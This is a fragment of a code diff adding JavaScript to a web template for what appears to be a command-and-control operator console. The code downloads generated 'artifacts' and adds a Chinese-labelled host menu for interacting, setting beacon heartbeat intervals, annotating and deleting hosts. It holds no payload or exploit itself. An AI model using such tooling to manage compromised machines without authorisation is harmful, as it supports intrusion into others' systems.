+  var a = state.lastArtifact;
+  if (!a) return;
+  var blob;
+  if (a.is_binary) {
+    var bin = atob(a.contentBase64);
+    var bytes = new Uint8Array(bin.length);
+    for (var i = 0; i < bin.length; i++) bytes[i] = bin.charCodeAt(i);
+    blob = new Blob([bytes], {type:'application/octet-stream'});
+  } else {
+    blob = new Blob([a.code], {type:'text/plain'});
+  }
+  var el = document.createElement('a');
+  el.href = URL.createObjectURL(blob);
+  el.download = a.filename;
+  el.click();
+}
+
+/* ---------------- host row context menu (source ContextMenu parity) ------ */
+function hideHostMenu() {
+  document.getElementById('host-menu').style.display = 'none';
+}
+function showHostMenu(ev, hostId) {
+  ev.preventDefault();
+  var nid = Number(hostId);
+  if (state.selectedHostId !== nid) selectHost(nid, false);
+  var m = document.getElementById('host-menu');
+  var items = [
+    {label:'交互（与双击同效）', fn:function(){ state.interactMode = true; renderDock(); }},
+    {label:'设置心跳间隔', fn:function(){ var v = prompt('Beacon 心跳间隔（秒）：'); if (v) setIntervalValue(parseInt(v,10)); }},
+    {label:'设置备注', fn:function(){ var v = prompt('主机备注：'); if (v !== null) setHostNote(v); }},
+    {label:'删除主机', danger:true, fn:function(){ deleteHost(nid, ev); }},
+  ];
+  m.innerHTML = '';
+  items.forEach(function(it) {
+    var b = document.createElement('button');
+    b.type = 'button';
+    b.textContent = it.label;
+    b.style.cssText = 'display:block;width:100%;text-align:left;padding:7px 10px;border:0;border-radius:7px;background:none;color:' + (it.danger ? 'var(--danger)' : 'var(--foreground)') + ';font-size:12px;cursor:pointer';
+    b.onmouseenter = function(){ b.style.background = 'color-mix(in srgb, rgb(var(--pm-accent-rgb)) 12%, transparent)'; };
+    b.onmouseleave = function(){ b.style.background = 'none'; };
+    b.onclick = function(ev2){ ev2.stopPropagation(); hideHostMenu(); it.fn(); };
+    m.appendChild(b);
+  });
+  m.style.display = 'block';
+  m.style.left = Math.min(ev.clientX, window.innerWidth - 210) + 'px';
+  m.style.top = Math.min(ev.clientY, window.innerHeight - 190) + 'px';
+}
+document.addEventListener('click', function(ev){
+  var m = document.getElementById('host-menu');
+  if (m.style.display === 'block' && !m.contains(ev.target)) hideHostMenu();
+});
+
+/* boot: initial merge of transcript-render markers */
+loadOverview();
+setInterval(loadOverview, 5000);
+
+/* make transcript renderer treat pre-existing boot line as local */
+(function(){ var first = $('#dock-output').firstChild; if (first) first.setAttribute('data-local','1'); })();
+</script>
+{% endblock %}
